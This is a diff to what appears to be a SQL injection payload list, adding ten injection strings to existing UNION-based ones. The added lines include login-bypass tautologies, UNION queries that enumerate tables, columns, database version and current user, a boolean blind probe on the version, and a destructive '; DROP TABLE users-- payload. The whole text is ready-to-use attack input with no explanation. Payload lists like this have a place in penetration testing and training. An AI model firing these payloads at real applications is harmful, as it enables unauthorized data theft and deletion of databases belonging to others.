@@ -3,3 +3,13 @@ sqlipayloads
 'UNION select first_name,password from users#
 'UNION SELECT table_name, NULL FROM information_schema.tables#
 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+' OR 'a'='a
+' UNION SELECT 1, 'text' FROM dual#
+'; DROP TABLE users--
+' OR 1=1 LIMIT 1 OFFSET 1#
+' UNION SELECT null, null, version()#
+'-' UNION SELECT database(), user()#
+' AND SUBSTRING((SELECT @@version), 1, 1)='5'
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
+') OR ('x'='x
+' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_type='BASE TABLE'#
